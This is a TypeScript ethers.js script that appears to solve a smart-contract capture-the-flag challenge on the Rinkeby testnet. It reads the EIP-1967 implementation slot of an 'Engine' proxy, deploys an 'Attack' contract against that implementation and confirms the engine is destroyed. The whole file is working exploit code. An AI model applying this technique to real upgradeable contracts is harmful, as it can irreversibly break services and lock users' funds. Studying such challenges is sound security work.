import { getDefaultProvider } from '@ethersproject/providers';
import { Wallet, utils } from 'ethers';
import { arrayify, hexStripZeros } from 'ethers/lib/utils';
import { readFileSync } from 'fs-extra';
import path from 'path/posix';
import { exit } from 'process';
import { Attack__factory } from '../types/ethers-contracts';
import { Engine__factory } from '../types/ethers-contracts/factories/Engine__factory';

// import {  } from '../types/ethers-contracts';

// const provider = getDefaultProvider("http://127.0.0.1:8545");
const provider = getDefaultProvider("rinkeby");
const testPrivKey = readFileSync(path.resolve(__dirname, "./../../../.privkey")).toString().trim();
// const testPrivKey = "";
const addr = "0x0741C1351091f58745F410973D5C1edBFada596a"

function toWei(eth: number) {
  return utils.parseEther(eth.toString())
}

async function main() {
  let alice = new Wallet(testPrivKey);
  alice = alice.connect(provider);
  const e_slot = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
  const e_addr = hexStripZeros(await provider.getStorageAt(addr, e_slot))
  console.log(e_addr)
  
  const proxy = Engine__factory.connect(addr, provider).connect(alice);
  console.log(await proxy.horsePower());
  // exit(0);
  (new Attack__factory(alice)).deploy(e_addr).then(async attacker => {
    await attacker.attack({
      gasLimit: 1000000
    });
    proxy.horsePower().catch(_e => {
      console.log("engine destoryed successfully.")
    })
  })


}

main().catch(e => {
  console.log("Error: " + e)
})
